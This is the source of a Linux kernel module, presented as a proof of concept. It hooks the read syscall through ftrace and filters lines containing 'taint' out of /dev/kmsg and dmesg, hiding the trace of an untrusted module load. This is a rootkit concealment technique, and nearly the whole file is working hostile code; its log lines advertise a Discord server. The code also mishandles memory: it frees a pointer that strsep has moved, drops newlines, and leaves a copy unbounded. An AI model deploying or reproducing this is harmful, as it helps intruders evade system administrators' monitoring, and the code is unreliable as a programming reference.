#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("POC/Demo hiding taint message from /dev/kmsg and dmesg");

/*
Important: If you don't know, the dmesg command reads /dev/kmsg directly. Therefore, the focus to hide the "taint" message should be on /dev/kmsg.
If you can hide it there, you can also hide it in dmesg.
However, this trick does not prevent the message from appearing in "journalctl -k".
But the main objective of this LKM is to demonstrate how to hide messages specifically from dmesg and /dev/kmsg.
*/

#define B_F 4096  // Temporary buffer size for reading

static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs); // Pointer to the original read function

// Hooked function that intercepts the syscall read
static asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
    int fd = regs->di; // First argument of read: fd
    char __user *user_buf = (char __user *)regs->si; // Second argument: output buffer for user
    size_t count = regs->dx; // Number of bytes to read
    char *kernel_buf;
    ssize_t bytes_read;
    struct file *file;

    // Check if the fd is from /dev/kmsg
    file = fget(fd); // Gets the file object corresponding to the fd
    if (file && strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0) {
        fput(file); // Frees the file object after verification

        // Allocates a temporary buffer in kernel space
        kernel_buf = kmalloc(B_F, GFP_KERNEL);
        if (!kernel_buf) {
            printk(KERN_ERR "Failed to allocate temporary buffer.\n");
            return -ENOMEM;
        }

        // Calls the original function to read data from /dev/kmsg
        bytes_read = orig_read(regs);
        if (bytes_read < 0) {
            kfree(kernel_buf);
            return bytes_read;
        }

        // Copies data read from user space to the buffer in the kernel for processing
        if (copy_from_user(kernel_buf, user_buf, bytes_read)) {
            kfree(kernel_buf);
            return -EFAULT;
        }

        // Filter message that contain the word "taint"
        char *filtered_buf = kzalloc(B_F, GFP_KERNEL); // Buffer for filtered messages
        if (!filtered_buf) {
            kfree(kernel_buf);
            return -ENOMEM;
        }

        char *t;
        size_t filtered_len = 0;

        t = strsep(&kernel_buf, "\n"); // Separate the string by line
        while (t) {
            if (!strstr(t, "taint")) { // Checks if the line contains "taint"
                // Add the filtered line to the buffer
                strncat(filtered_buf, t, B_F - filtered_len - 1);
                filtered_len = strlen(filtered_buf); // Update filtered buffer size
            }
            t = strsep(&kernel_buf, "\n"); // Process the next line
        }

        // Ensures the final buffer is null-terminated
        filtered_buf[B_F - 1] = '\0';

        // Copy the filtered buffer back to userspace
        if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
            kfree(kernel_buf);
            kfree(filtered_buf);
            return -EFAULT;
        }

        kfree(kernel_buf);
        kfree(filtered_buf);
        return filtered_len;
    }

    if (file)
        fput(file); // Frees the file object if it is not /dev/kmsg

    return orig_read(regs); // Calls the original reading function if it is not /dev/kmsg
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_read", hook_read, &orig_read),
};

static int __init poop_init(void) {
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        printk(KERN_ERR "Oh nooo, error ://\n");
        return err;
    }
    printk(KERN_INFO "Join: https://discord.gg/66N5ZQppU7.\n");
    return 0;
}

static void __exit poop_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "Join: https://discord.gg/66N5ZQppU7\n");
}

module_init(poop_init);
module_exit(poop_exit);
